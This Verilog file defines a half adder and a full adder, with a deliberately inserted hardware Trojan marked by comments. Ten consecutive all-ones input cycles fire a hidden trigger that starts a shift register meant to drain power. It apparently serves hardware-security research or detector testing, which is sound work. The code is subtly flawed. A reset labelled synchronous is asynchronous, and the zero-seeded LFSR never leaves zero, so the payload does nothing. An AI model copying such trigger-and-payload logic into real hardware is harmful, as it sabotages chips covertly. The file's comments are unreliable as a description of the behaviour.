module half_adder (
    input  a, b,
    output sum, carry
);
    assign sum   = a ^ b;   // XOR for sum
    assign carry = a & b;   // AND for carry
endmodule


module full_adder (
    input  a, b, cin,
    output sum, cout,
    input  clk,           // Trojan: clock input added
    input  rst_n          // Trojan: synchronous active-low reset added
);
    wire s1, c1, c2;

    half_adder ha1 (
        .a(a),
        .b(b),
        .sum(s1),
        .carry(c1)
    );

    half_adder ha2 (
        .a(s1),
        .b(cin),
        .sum(sum),
        .carry(c2)
    );

    // Final carry
    assign cout = c1 | c2;

    // ======== Trojan insertion begins ========

    // Trojan: 8-bit event counter
    reg [7:0] event_cnt;
    // Trojan: Trigger signal, activated when a==1, b==1, cin==1 for 10 consecutive cycles
    reg trigger;
    reg [3:0] match_cnt;

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            event_cnt <= 8'b0;
            trigger   <= 1'b0;
            match_cnt <= 4'b0;
        end else begin
            // Event tracking: monitoring if all inputs are '1'
            if (a & b & cin) begin
                if (match_cnt < 10)
                    match_cnt <= match_cnt + 1'b1;
            end else begin
                match_cnt <= 4'b0;
            end

            if (match_cnt == 10)
                trigger <= 1'b1;

            // Trojan: activate shift register accumulator when triggered
            if (trigger) begin
                // Run a continuously shifting register to draw extra power
                event_cnt <= {event_cnt[6:0], event_cnt[7] ^ event_cnt[5] ^ event_cnt[2] ^ event_cnt[1]};
            end
        end
    end

    // ======== Trojan insertion ends ========

endmodule
